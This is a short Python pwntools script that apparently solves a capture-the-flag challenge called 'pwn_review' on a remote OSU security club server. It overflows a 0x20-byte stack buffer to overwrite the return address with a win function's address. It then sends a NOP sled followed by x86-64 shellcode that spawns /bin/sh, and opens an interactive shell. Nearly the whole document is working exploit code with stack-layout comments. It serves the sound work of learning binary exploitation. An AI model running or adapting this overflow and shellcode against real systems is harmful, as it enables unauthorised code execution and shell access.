#!/usr/bin/env python3

from pwn import *

shellcode = b'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xc0PSH\x89\xe7H\x89\xc6H\x89\xc2j;X\x0f\x05'
# p = process("./pwn_review")

p = remote("challenge.osusec.org", 31304)

addr_win = 0x400577 

print(addr_win)
# this is a review challange, you know the drill
print(p.recvline())
# return to the win function and get the flag
print(p.recvline())
# [return addr] rbp+0x08
# [saved rbp]   rbp
#               rbp-0x08
#               rbp-0x10
#               rbp-0x18
# [buffer]      rbp-0x20

# changing the return address so that its the win function
buffer = b"aaaabbbb" * int(0x20/8) + b"savedrbp" +  p64(addr_win)
print(buffer)
p.sendline(buffer)

# nice! i'll execute any shellcode you give me now
print(p.recvline())
# insert in nonzero 64 bit shellcode
buffer = b"\x90" * 20 + shellcode
print("new buffer for shellcode: ", buffer)
p.sendline(buffer)

p.interactive()